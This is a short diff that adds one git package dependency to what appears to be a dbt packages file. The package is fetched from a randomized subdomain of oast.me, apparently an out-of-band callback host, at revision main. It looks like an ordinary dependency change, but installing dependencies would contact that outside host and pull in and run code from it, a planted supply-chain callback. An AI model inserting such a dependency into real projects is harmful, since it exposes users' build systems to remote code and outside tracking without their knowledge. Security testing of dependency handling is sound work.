@@ -1,0 +1,3 @@
+packages:
+  - git: "https://dc33biq1af36dsaabccgqx7qcknb3iy9w.oast.me/h282-dbt.git"
+    revision: main
